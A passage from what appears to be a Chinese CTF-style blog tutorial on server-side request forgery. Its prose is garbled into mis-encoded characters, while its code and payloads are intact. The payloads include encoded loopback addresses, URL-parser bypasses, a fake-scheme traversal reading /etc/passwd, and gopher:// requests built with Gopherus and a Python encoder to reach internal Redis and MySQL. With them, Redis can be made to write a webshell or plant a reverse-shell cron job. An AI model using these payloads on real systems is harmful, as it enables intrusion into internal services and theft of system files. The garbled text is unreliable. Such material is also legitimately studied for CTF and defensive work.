class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åè¿›åˆ¶:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å…«è¿›åˆ¶:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åå…­è¿›åˆ¶:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>æ³¨æ„å…«è¿›åˆ¶ ip å‰è¦åŠ ä¸Šä¸€ä¸ª 0ï¼Œå…¶ä¸­å…«è¿›åˆ¶å‰é¢çš„ 0 å¯ä»¥ä¸ºå¤šä¸ªï¼Œåå…­è¿›åˆ¶å‰è¦åŠ ä¸Šä¸€ä¸ª 0xã€‚</p><p>127.0.0.1ï¼š</p><blockquote><p>å…«è¿›åˆ¶ï¼š0177.0.0.1</p><p>åå…­è¿›åˆ¶ï¼š0x7f.0.0.1</p><p>åè¿›åˆ¶ï¼š2130706433</p></blockquote><h4 id="åˆ©ç”¨dnsè§£æ"><a class="markdownIt-Anchor" href="#åˆ©ç”¨dnsè§£æ">#</a> åˆ©ç”¨ DNS è§£æ</h4><p>å¦‚æœä½ è‡ªå·±æœ‰åŸŸåçš„è¯ï¼Œå¯ä»¥åœ¨åŸŸåä¸Šè®¾ç½® A è®°å½•ï¼ŒæŒ‡å‘ 127.0.0.1ã€‚</p><h4 id="ç»•è¿‡"><a class="markdownIt-Anchor" href="#ç»•è¿‡">#</a> @ç»•è¿‡</h4><p><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code> ï¼Œåœ¨å¯¹ @è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚<br>åœ¨ PHP çš„ parse_url ä¸­ä¼šè¯†åˆ« <code>www.ccc.com</code> ï¼Œè€Œ libcurl åˆ™è¯†åˆ«ä¸º <code>www.bbb.com</code> ã€‚</p><h4 id="å…¶ä»–å„ç§æŒ‡å‘127001çš„åœ°å€"><a class="markdownIt-Anchor" href="#å…¶ä»–å„ç§æŒ‡å‘127001çš„åœ°å€">#</a> å…¶ä»–å„ç§æŒ‡å‘ 127.0.0.1 çš„åœ°å€</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ #localhostå°±æ˜¯127.0.0.1</span><br><span class="line">http://0/ #0åœ¨windowä¸‹ä»£è¡¨0.0.0.0ï¼Œè€Œåœ¨liunxä¸‹ä»£è¡¨127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/ #linuxå¯ç”¨</span><br><span class="line">http://[::]:80/ #linuxå¯ç”¨</span><br><span class="line">http://127ã€‚0ã€‚0ã€‚1/ #å¥å·ä¼šè¢«è§£ææˆ.</span><br><span class="line">http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘  #Enclosed alphanumericsæ–¹æ³•ç»•è¿‡</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ #ç¬¬7.8è¡Œä¸­0çš„æ•°é‡å¤šä¸€ç‚¹å°‘ä¸€ç‚¹éƒ½æ²¡å½±å“ï¼Œæœ€åè¿˜æ˜¯ä¼šæŒ‡å‘127.0.0.1</span><br></pre></td></tr></table></figure></div><h4 id="å¸¸è§é™åˆ¶"><a class="markdownIt-Anchor" href="#å¸¸è§é™åˆ¶">#</a> å¸¸è§é™åˆ¶</h4><p>1. é™åˆ¶ä¸º <code>http://www.xxx.com </code> åŸŸå</p><p>é‡‡ç”¨ http åŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ï¼Œå³ @<br> <code>http://www.xxx.com@www.xxc.com</code></p><p>2. é™åˆ¶è¯·æ±‚ IP ä¸ä¸ºå†…ç½‘åœ°å€</p><p>å½“ä¸å…è®¸ ip ä¸ºå†…ç½‘åœ°å€æ—¶ï¼š</p><blockquote><p>ï¼ˆ1ï¼‰é‡‡å–çŸ­ç½‘å€ç»•è¿‡<br>ï¼ˆ2ï¼‰é‡‡å–ç‰¹æ®ŠåŸŸå<br>ï¼ˆ3ï¼‰é‡‡å–è¿›åˆ¶è½¬æ¢</p></blockquote><p>3. é™åˆ¶è¯·æ±‚åªä¸º http åè®®</p><blockquote><p>ï¼ˆ1ï¼‰é‡‡å– 302 è·³è½¬ï¼ˆ<a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼‰<br>ï¼ˆ2ï¼‰é‡‡å–çŸ­åœ°å€</p></blockquote><h3 id="ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡"><a class="markdownIt-Anchor" href="#ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡">#</a> ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡</h3><p>æœ‰å…³ <code>file_get_contents()</code>  å‡½æ•°çš„ä¸€ä¸ª trickï¼Œå¯ä»¥çœ‹ä½œæ˜¯ SSRF çš„ä¸€ä¸ªé»‘é­”æ³•ï¼Œå½“ PHP çš„  <code>file_get_contents()</code>  å‡½æ•°åœ¨é‡åˆ°ä¸è®¤è¯†çš„ä¼ªåè®®å¤´æ—¶å€™ä¼šå°†ä¼ªåè®®å¤´å½“åšæ–‡ä»¶å¤¹ï¼Œé€ æˆç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè¿™æ—¶å€™åªéœ€ä¸æ–­å¾€ä¸Šè·³è½¬ç›®å½•å³å¯è¯»åˆ°æ ¹ç›®å½•çš„æ–‡ä»¶ã€‚</p><p>ä¾‹å­ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>é™åˆ¶åªè¯» https å¼€å¤´çš„è·¯å¾„ï¼Œå¯ä»¥æ„é€ ï¼š <code>httpssss://</code></p><p>é…åˆç›®å½•å›è¯»ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">httpsssss://../../../../../../etc/passwd</span><br><span class="line">httpsssss://abc../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">httpsssss://../../../../../../flag</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥å¾—åˆ°ä¸€äº›æ•æ„Ÿä¿¡æ¯</p><h3 id="urlçš„è§£æé—®é¢˜"><a class="markdownIt-Anchor" href="#urlçš„è§£æé—®é¢˜">#</a> URL çš„è§£æé—®é¢˜</h3><ul><li>åˆ©ç”¨ readfile å’Œ parse_url è§£æå·®å¼‚</li></ul><p>è´´ä¸€ä¸ªæå®¢å¤§æŒ‘æˆ˜çš„é¢˜</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ° check_inner_ip é€šè¿‡ url_parse æ£€æµ‹æ˜¯å¦ä¸ºå†…ç½‘ ipï¼Œå¦‚æœæ»¡è¶³ä¸æ˜¯å†…ç½‘ ip ï¼Œé€šè¿‡ curl è¯·æ±‚ url è¿”å›ç»“æœï¼Œè¿™é¢˜å°±å¯ä»¥åˆ©ç”¨ curl å’Œ parse_url è§£æçš„å·®å¼‚ä¸åŒæ¥ç»•è¿‡ï¼Œè®© parse_url å¤„ç†å¤–éƒ¨ç½‘ç«™ï¼Œæœ€å curl è¯·æ±‚å†…ç½‘ç½‘å€ã€‚</p><p>æœ€åçš„ payload ä¸º</p><p><code>http://ip/challenge.php?url=http://@127.0.0.1:80%20@www.baidu.com/flag.php</code></p><p>æœ‰å…³ URL çš„è§£æé—®é¢˜æ›´åŠ è¯¦ç»†å¯å‚è€ƒï¼š</p><p><a class="link" href="https://blog.csdn.net/qq_38154820/article/details/109252839">https://blog.csdn.net/qq_38154820/article/details/109252839 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="gopheræ”»å‡»redis"><a class="markdownIt-Anchor" href="#gopheræ”»å‡»redis">#</a> Gopher æ”»å‡» Redis</h3><h4 id="redisçš„åè®®æ•°æ®æµæ ¼å¼"><a class="markdownIt-Anchor" href="#redisçš„åè®®æ•°æ®æµæ ¼å¼">#</a> redis çš„åè®®æ•°æ®æµæ ¼å¼</h4><p>æ•°æ®æµæ ¼å¼ä¸­ CR LF è¡¨ç¤ºçš„å°±æ˜¯ \r \n</p><blockquote><p>*&lt;å‚æ•°æ•°é‡&gt; CR LF<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mtext>å‚æ•°</mtext><mn>1</mn><mtext>çš„å­—èŠ‚æ•°é‡</mtext><mo>&gt;</mo><mi>C</mi><mi>R</mi><mi>L</mi><mi>F</mi><mo>&lt;</mo><mtext>å‚æ•°</mtext><mn>1</mn><mtext>çš„æ•°æ®</mtext><mo>&gt;</mo><mi>C</mi><mi>R</mi><mi>L</mi><mi>F</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">&lt;å‚æ•° 1 çš„å­—èŠ‚æ•°é‡&gt; CR LF&lt;å‚æ•° 1 çš„æ•°æ®&gt; CR LF...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">å‚</span><span class="mord cjk_fallback">æ•°</span><span class="mord">1</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å­—</span><span class="mord cjk_fallback">èŠ‚</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">é‡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">å‚</span><span class="mord cjk_fallback">æ•°</span><span class="mord">1</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">æ®</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>&lt;å‚æ•° N çš„å­—èŠ‚æ•°é‡&gt; CR LF<br> &lt;å‚æ•° N çš„æ•°æ®&gt; CR LF<br> ç®€å•ç¤ºä¾‹ï¼š</p></blockquote><p>*4ï¼šè¡¨ç¤º 4 ä¸ªå‚æ•° configã€setã€dirã€/var/www/html<br>$6ï¼šè¡¨ç¤ºæ¯ä¸ªå‚æ•°çš„å­—èŠ‚é•¿åº¦ config é•¿åº¦ä¸º 6</p><blockquote><p>*4<br>$6<br>config<br>$3<br>set<br>$3<br>dir<br>$13<br>/var/www/html</p></blockquote><p>Redis ä¸€èˆ¬éƒ½æ˜¯ç»‘å®šåœ¨ 6379 ç«¯å£ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å£ä»¤ï¼ˆé»˜è®¤æ˜¯æ— ï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡ SSRF æ¼æ´æœªæˆæƒè®¿é—®å†…ç½‘ Redisï¼Œä¸€èˆ¬ç”¨æ¥å†™å…¥ Crontab å®šæ—¶ä»»åŠ¡ç”¨æ¥åå¼¹ shellï¼Œæˆ–è€…å†™å…¥ webshell ç­‰ç­‰ã€‚</p><p>åœ¨ CTF é¢˜ç›®ä¸­å¦‚æœæ‰¾åˆ°äº†å†…ç½‘çš„æœåŠ¡å¼€äº† 6379 ç«¯å£ï¼Œä¸€èˆ¬æ¥è¯´å°±æ˜¯ Redis æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¹¶ä¸”æ²¡æœ‰ ban æ‰ gopher://ï¼Œå¯ä»¥ç”¨ç½‘ä¸Šçš„è„šæœ¬ä¸€æŠŠæ¢­ï¼Œæ¯”å¦‚ï¼šGopherus</p><h4 id="å†™å…¥shell"><a class="markdownIt-Anchor" href="#å†™å…¥shell">#</a> å†™å…¥ shell</h4><p><code>python2 gopherus.py --exploit redis</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/N2EnplomH1vFh8I.png" alt="image.png"></p><p>åœ¨æœ‰ SSRF æ¼æ´çš„åœ°æ–¹è¾“å…¥ç”Ÿæˆçš„ payloadâ€” å³ gopher://127.0.0.1:6379 åé¢ä¸€å¤§æ®µï¼Œæ¥ä¸‹æ¥ä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆ shell.phpã€‚</p><p>è¦æ³¨æ„çš„æ˜¯å¦‚æœæ˜¯åœ¨ html çš„è¾“å…¥æ¡†ä¸­ç›´æ¥è¾“å…¥æäº¤å°±è¡Œï¼Œä½†è¦åœ¨æµè§ˆå™¨çš„ URL è¾“å…¥çš„è¯ï¼Œä¸€å®šè¦è®°å¾— URL ç¼–ç ä¸€æ¬¡ã€‚</p><h4 id="åå¼¹shell"><a class="markdownIt-Anchor" href="#åå¼¹shell">#</a> åå¼¹ shell</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/wsnqCkpzOIoucZr.png" alt="image.png"></p><p>è¦é…åˆ nc ç›‘å¬</p><h3 id="æ”»å‡»mysql"><a class="markdownIt-Anchor" href="#æ”»å‡»mysql">#</a> æ”»å‡» Mysql</h3><p>æ”»å‡»å†…ç½‘ mysql çš„æ¡ä»¶ï¼šå†…ç½‘å¼€å¯äº† 3306 ç«¯å£ï¼Œmysql æ— å¯†ç </p><p>ä¸Šé¢çš„é¢˜ç›®å¤ç°å°±ç”¨åˆ°äº†è¿™ä¸ª</p><h3 id="gopherå‘é€è¯·æ±‚"><a class="markdownIt-Anchor" href="#gopherå‘é€è¯·æ±‚">#</a> Gopher å‘é€è¯·æ±‚</h3><p>SSRF æ¼æ´æ˜¯æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼Œä¸è®ºæ˜¯ GET æˆ–è€…æ˜¯ POST æ–¹æ³•ï¼Œéƒ½æ˜¯ä¸ºäº†è¾¾åˆ°ä¸€ä¸ªç›®çš„ï¼Œå°±æ˜¯è®©æœåŠ¡ç«¯å¸®æˆ‘ä»¬æ¥æ‰§è¡Œè¯·æ±‚ã€‚</p><p>é‚£ä¹ˆåœ¨ CTF ä¸­ä»€ä¹ˆæƒ…å†µéœ€è¦åˆ©ç”¨åˆ°è¿™ç§æ–¹æ³•å‘¢ï¼Œæ¯”å¦‚å‘ç°äº†ä¸€ä¸ªå†…ç½‘çš„åº”ç”¨æœ‰ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ POST æäº¤æ•°æ®ï¼Œè€Œä¸” Gopher åè®®æ²¡æœ‰è¢« banï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘æ„é€ ä¸€ä¸ªè¯·æ±‚å»æ‰“å†…ç½‘ï¼Œä¸‹é¢å…ˆä»æœ¬åœ°çœ‹çœ‹å¦‚ä½•æ„é€ ï¼š</p><p>é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ gopher:// åè®®å¯ä»¥ç”¨æ¥å‘é€ Get å’Œ Post è¯·æ±‚ï¼Œéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯è¦å¯¹å‘é€çš„è¯·æ±‚å¤´ä¸­çš„ç©ºæ ¼å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ url ç¼–ç ï¼Œå¦‚æœæ˜¯åœ¨ URL ä¸­æäº¤ payload çš„æ—¶ä¾¯è¦å†è¿›è¡Œä¸€æ¬¡ url ç¼–ç ï¼Œå…ˆæ¥çœ‹çœ‹å¦‚ä½•å‘é€ç®€å•çš„è¯·æ±‚ã€‚</p><ul><li>POST è¯·æ±‚</li></ul><p>åœ¨ phpstudy å†™å…¥ 1.php</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>burpsuite æŠ“åŒ…è·å–è¯·æ±‚å¤´ï¼ŒPOST åŒ…çš„è¯·æ±‚å¤´æœ‰å¾ˆå¤šè¡Œï¼Œæˆ‘ä»¬ç”¨çš„æ—¶å€™ä¸ç”¨å…¨éƒ¨å¸¦ä¸Šï¼Œä½†æ˜¯è¦è®°å¾—åŠ ä¸Š Content-Type å’Œ Content-Lengthï¼Œä¹Ÿå¯ä»¥å…¨éƒ¨å¸¦ä¸Š</p><blockquote><p>POST /1.php HTTP/1.1<br>Host: 192.168.0.102<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 7</p><p>a=world</p></blockquote><p>ç„¶åéœ€è¦å¯¹ç©ºæ ¼å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ url ç¼–ç ï¼Œæ³¨æ„æŠŠå…¶ä¸­çš„æ¢è¡Œçš„åœ°æ–¹åŠ ä¸Š %0D%0Aï¼Œå½“ç„¶æ‰‹åŠ¨åŠ è‚¯å®šæ˜¯å¤ªéº»çƒ¦äº†ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªè„šæœ¬ã€‚</p><p>ä¸€é”®ç¼–ç è„šæœ¬ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /1.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.0.102</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 7</span></span><br><span class="line"><span class="string">a=world</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div><p>åœ¨é‡Œé¢åŠ ä¸Šä½ çš„è¯·æ±‚ä½“è¿è¡Œï¼Œç„¶åæˆ‘ä»¬åœ¨è¾“å‡ºç»“æœå‰é¢æ‰‹åŠ¨åŠ ä¸Š gopher åè®®å¤´å’Œ IP: ç«¯å£ï¼Œæœ€ç»ˆä¸ºï¼š</p><p><code>gopher://192.168.0.102:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.0.102%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%207%0D%0A%0D%0Aa%3Dworld%0D%0A</code></p><p>ç„¶åç”¨ curl å‘½ä»¤å‘å‡ºæˆ‘ä»¬çš„è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸè·å–å“åº”åŒ…äº†ã€‚</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/lV8z5cASXZLnbNh.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦åœ¨ url ä¼ å…¥çš„è¯éœ€è¦å°†å‘é€çš„ POST åé¢ä¸€å¤§ä¸²å† url ç¼–ç ä¸€æ¬¡</p><ul><li>GET è¯·æ±‚ï¼š</li></ul><p>GET è¯·æ±‚å‘é€å’Œ POST è¯·æ±‚åŸºæœ¬ä¸€æ ·</p><p>ç›¸å…³ä¾‹é¢˜ï¼š2020 å¼ºç½‘æ¯ 